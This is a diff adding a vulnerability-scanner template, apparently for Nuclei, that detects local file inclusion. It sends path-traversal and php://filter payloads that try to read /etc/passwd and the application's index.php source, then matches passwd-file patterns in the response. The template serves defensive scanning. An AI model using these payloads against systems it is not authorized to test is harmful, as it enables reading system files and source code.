@@ -1,0 +1,28 @@
+id: shaheen-lfi
+info:
+  name: "Local File Inclusion (LFI)"
+  author: Professor Snape
+  severity: high
+  description: Detects local file inclusion vulnerabilities
+  tags: lfi,rfi,owasp-a01
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?page=../etc/passwd"
+      - "{{BaseURL}}/?file=....//....//etc/passwd"
+      - "{{BaseURL}}/?path=%2e%2e%2fetc%2fpasswd"
+      - "{{BaseURL}}/?include=php://filter/convert.base64-encode/resource=index.php"
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:[x*]:0:0:"
+          - "daemon:[x*]:[0-9]+:[0-9]+"
+      - type: word
+        part: body
+        words:
+          - "/bin/bash"
+          - "/bin/sh"
+          - "nobody:x:"
